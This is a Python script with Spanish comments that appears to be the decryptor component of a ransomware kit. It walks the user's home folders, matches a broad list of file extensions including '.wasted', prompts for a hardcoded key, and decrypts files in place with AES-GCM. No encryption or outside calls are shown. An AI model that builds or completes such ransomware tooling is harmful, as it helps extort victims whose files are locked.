import os
import sys
import subprocess
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2


# Rutas comunes a las carpetas del usuario
user_folders = [
    os.path.join(os.path.expanduser("~"), "Desktop"),
    os.path.join(os.path.expanduser("~"), "Pictures"),
    os.path.join(os.path.expanduser("~"), "Videos"),
    os.path.join(os.path.expanduser("~"), "Music"),
    os.path.join(os.path.expanduser("~"), "Documents"),
    os.path.join(os.path.expanduser("~"), "Downloads")
]

# Extensiones de archivos a desencriptar
file_extensions = {
    ".exe", ".dll", ".so", ".rpm", ".deb", ".vmlinuz", ".img",
    ".jpg", ".jpeg", ".bmp", ".gif", ".png", ".svg", ".psd", ".raw",
    ".mp3", ".mp4", ".m4a", ".aac", ".ogg", ".flac", ".wav", ".wma", ".aiff", ".ape",
    ".avi", ".flv", ".m4v", ".mkv", ".mov", ".mpg", ".mpeg", ".wmv", ".swf", ".3gp",
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".odt", ".odp", ".ods", ".txt", ".rtf", ".tex", ".pdf", ".epub", ".md",
    ".yml", ".yaml", ".json", ".xml", ".csv",
    ".db", ".sql", ".dbf", ".mdb", ".iso",
    ".html", ".htm", ".xhtml", ".php", ".asp", ".aspx", ".js", ".jsp", ".css",
    ".c", ".cpp", ".cxx", ".h", ".hpp", ".hxx",
    ".java", ".class", ".jar",
    ".ps", ".bat", ".vb",
    ".awk", ".sh", ".cgi", ".pl", ".ada", ".swift",
    ".go", ".py", ".pyc", ".bf", ".coffee",
    ".zip", ".tar", ".tgz", ".bz2", ".7z", ".rar", ".bak",
    ".wasted"
}

# Clave correcta para desencriptación
correct_password = "strong_password"  # Contraseña correcta para verificar

# Solicita la clave al usuario y controla los intentos
def get_key_from_password():
    for attempt in range(3):
        password = input("Introduce la clave de desencriptación: ")
        if password == correct_password:
            return password
        else:
            remaining_attempts = 2 - attempt
            if remaining_attempts > 0:
                print(f"Clave incorrecta. Te quedan {remaining_attempts} intento(s).")
            else:
                print("Has excedido el número de intentos.")
                sys.exit()

# Función para desencriptar un archivo
def decrypt_file(file_path, password):
    try:
        with open(file_path, "rb") as file:
            # Lee el salt, nonce, tag y ciphertext
            salt = file.read(16)           # Lee el salt
            nonce = file.read(16)          # Lee el nonce
            tag = file.read(16)            # Lee el tag
            ciphertext = file.read()       # Lee los datos encriptados
        
            # Verifica que los datos leídos sean válidos
            if len(nonce) != 16:
                raise ValueError(f"Nonce inválido o vacío en el archivo {file_path}")

        # Genera la clave con el salt específico de cada archivo
        key = PBKDF2(password, salt, dkLen=32)  # Clave de 256 bits

        # Inicializa el cifrador con la clave y el nonce
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        
        # Escribe el archivo desencriptado
        with open(file_path, "wb") as file:
            file.write(plaintext)
        print(f"Archivo desencriptado: {file_path}")
    
    except (ValueError, OSError) as e:
        print(f"Error en la desencriptación del archivo {file_path}: {e}")

# Solicita la clave y desencripta los archivos
password = get_key_from_password()

# Busca y desencripta archivos en las carpetas del usuario
for folder in user_folders:
    for root, dirs, files in os.walk(folder):
        for filename in files:
            if any(filename.endswith(ext) for ext in file_extensions):
                file_path = os.path.join(root, filename)
                decrypt_file(file_path, password)
